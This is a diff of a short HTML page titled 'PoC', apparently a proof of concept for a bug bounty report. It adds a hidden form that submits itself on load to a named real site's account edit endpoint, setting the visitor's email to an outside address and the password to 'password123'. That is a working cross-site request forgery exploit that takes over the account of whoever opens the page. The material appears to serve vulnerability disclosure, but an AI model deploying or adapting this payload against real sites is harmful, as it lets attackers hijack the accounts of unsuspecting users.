@@ -1,6 +1,26 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Hello, World!</title>
+    <meta charset="UTF-8">
+    <title>PoC</title>
 </head>
 <body>
+
+<form id="autoForm" action="https://www.vnimavedeti.sk/e/account/saveedit" method="POST">
+    <input type="hidden" name="email" value="0xkiw1+1@intigriti.me">
+    <input type="hidden" name="password" value="password123">
+    <input type="hidden" name="password_check" value="password123">
+    <input type="hidden" name="name" value="test">
+    <input type="hidden" name="surname" value="test">
+    <input type="hidden" name="captcha" value="">
+    <input type="hidden" name="btnSubmit" value=" ">
+</form>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    document.getElementById("autoForm").submit();
+});
+</script>
+
+</body>
+</html>
